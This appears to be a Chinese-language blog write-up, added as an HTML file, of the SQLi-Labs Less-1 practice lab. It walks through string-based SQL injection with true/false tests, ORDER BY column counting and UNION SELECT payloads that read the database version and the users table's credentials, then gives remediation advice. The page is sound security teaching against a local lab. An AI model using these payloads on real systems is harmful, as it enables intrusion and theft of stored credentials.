@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLi-Labs Less-1 Writeup - gz2008的技术博客</title>
+  <style>
+    body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+    .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+    .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+    .back-link:hover { text-decoration: underline; }
+    h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+    .tags { margin-bottom: 25px; }
+    .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+    h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+    p { margin-bottom: 15px; color: #475569; }
+    ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+    li { margin-bottom: 8px; }
+    code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; overflow-wrap: anywhere; }
+    pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+    table { width: 100%; border-collapse: collapse; margin: 16px 0 22px; }
+    th, td { border: 1px solid #e2e8f0; padding: 9px 12px; text-align: left; vertical-align: top; }
+    th { background: #f8fafc; color: #334155; }
+    .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; margin: 20px 0; }
+    .result { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-family: Consolas, monospace; margin: 20px 0; overflow-wrap: anywhere; }
+    @media (max-width: 600px) { body { padding: 0; } .container { padding: 24px 18px; border-radius: 0; } table { display: block; overflow-x: auto; } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <a href="index.html" class="back-link">← 返回 SQLi-Labs 首页</a>
+
+    <h1>SQLi-Labs Less-1：GET 字符型报错与联合查询注入</h1>
+
+    <div class="tags">
+      <span class="tag"># SQLi-Labs</span>
+      <span class="tag"># Web</span>
+      <span class="tag"># SQL注入</span>
+      <span class="tag"># GET</span>
+      <span class="tag"># 字符型</span>
+      <span class="tag"># UNION</span>
+    </div>
+
+    <h2>一、题目信息</h2>
+    <ul>
+      <li><strong>题目：</strong>SQLi-Labs Less-1 - Error Based - String</li>
+      <li><strong>方向：</strong>Web / SQL Injection</li>
+      <li><strong>环境：</strong>本地授权 SQLi-Labs 靶场</li>
+      <li><strong>目标：</strong>确认 GET 参数存在字符型 SQL 注入，并读取数据库信息。</li>
+      <li><strong>Flag：</strong>该靶场没有 flag，以成功读取数据库信息作为验证结果。</li>
+    </ul>
+
+    <h2>二、观察入口与源码</h2>
+    <p>第 1 关通过 URL 参数 <code>id</code> 查询用户。正常访问时页面返回用户 <code>Dumb</code>：</p>
+    <pre>http://127.0.0.1:18080/Less-1/?id=1</pre>
+    <p>查看本地源码后，可以看到参数没有经过类型转换或参数绑定，直接拼接进了单引号包围的 SQL 字符串：</p>
+    <pre>$id = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";</pre>
+    <p>由于输入位置位于单引号内部，攻击者可以先用单引号闭合字符串，再追加 SQL 条件或查询语句。</p>
+
+    <h2>三、确认字符型注入</h2>
+    <p>分别提交永真和永假条件，观察页面返回的用户信息是否变化：</p>
+    <table>
+      <thead><tr><th>输入</th><th>页面的 SQL 条件</th><th>预期</th></tr></thead>
+      <tbody>
+        <tr><td><code>1' and '1'='1</code></td><td>真条件</td><td>返回 Dumb / Dumb</td></tr>
+        <tr><td><code>1' and '1'='2</code></td><td>假条件</td><td>不返回用户信息</td></tr>
+      </tbody>
+    </table>
+    <p>实际验证结果如下：</p>
+    <div class="result">id=1' and '1'='1 → Welcome Dhakkan<br>Your Login name:Dumb<br>Your Password:Dumb</div>
+    <div class="result">id=1' and '1'='2 → Welcome Dhakkan<br>（没有用户信息）</div>
+    <p>真假条件产生了不同的页面结果，说明单引号成功改变了原有 SQL 条件，注入点成立。</p>
+
+    <h2>四、判断查询列数</h2>
+    <p>使用 <code>ORDER BY</code> 逐列测试。第 3 列仍然正常，第 4 列出现错误：</p>
+    <pre>id=1' order by 3#
+id=1' order by 4#</pre>
+    <pre>Unknown column '4' in 'order clause'</pre>
+    <p>因此当前查询共有 3 列，后续可以使用三列 <code>UNION SELECT</code>。</p>
+
+    <h2>五、联合查询读取数据库信息</h2>
+    <p>将原查询结果置空，再让查询返回数据库名和版本号。页面第二列显示数据库名，第三列显示版本号：</p>
+    <pre>id=-1' union select 1,database(),version()#</pre>
+    <div class="result">Your Login name:security<br>Your Password:5.5.44-0ubuntu0.14.04.1</div>
+
+    <p>继续把 <code>users</code> 表中的用户名和密码合并到结果中，验证可以通过 UNION 读取业务表数据：</p>
+    <pre>id=-1' union select 1,group_concat(username),group_concat(password) from users#</pre>
+    <div class="result">Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</div>
+    <p>用户名和对应的密码都被成功读出，说明注入不仅能改变条件，还能跨表读取数据。</p>
+
+    <div class="note">
+      <strong>URL 编码说明：</strong>
+      <code>#</code> 在 URL 中表示片段标识符，直接放进地址栏时可能不会发送给服务器。复现时应编码为 <code>%23</code>。例如：
+      <code>?id=-1%27%20union%20select%201%2Cdatabase()%2Cversion()%23</code>
+    </div>
+
+    <h2>六、完整请求示例</h2>
+    <pre>GET /Less-1/?id=-1%27%20union%20select%201%2Cdatabase()%2Cversion()%23 HTTP/1.1
+Host: 127.0.0.1:18080</pre>
+    <p>解码后的 payload 为：</p>
+    <pre>-1' union select 1,database(),version()#</pre>
+
+    <h2>七、漏洞原因与影响</h2>
+    <p>根因是把用户输入直接拼接进 SQL，导致输入被数据库解释为 SQL 语法，而不是普通数据。攻击者可以改变查询条件、读取其他表的数据，甚至进一步利用数据库权限访问敏感信息。</p>
+
+    <h2>八、修复建议</h2>
+    <ul>
+      <li>使用 PDO 或 mysqli 预处理语句，将 <code>id</code> 作为参数绑定，禁止直接拼接。</li>
+      <li>对数字型参数执行严格的整数校验，并统一类型转换。</li>
+      <li>关闭生产环境中的详细数据库错误回显，避免泄露 SQL 结构和数据库版本。</li>
+      <li>数据库账号遵循最小权限原则，只授予业务所需的表和数据操作权限。</li>
+    </ul>
+
+    <h2>九、复盘</h2>
+    <p>第 1 关的关键是按顺序完成四件事：用单引号确认字符型注入点，用真假条件确认页面差异，用 <code>ORDER BY</code> 判断列数，再用 <code>UNION SELECT</code> 读取数据库信息。相比直接背 payload，更重要的是先看懂源码中的引号闭合方式。</p>
+  </div>
+</body>
+</html>
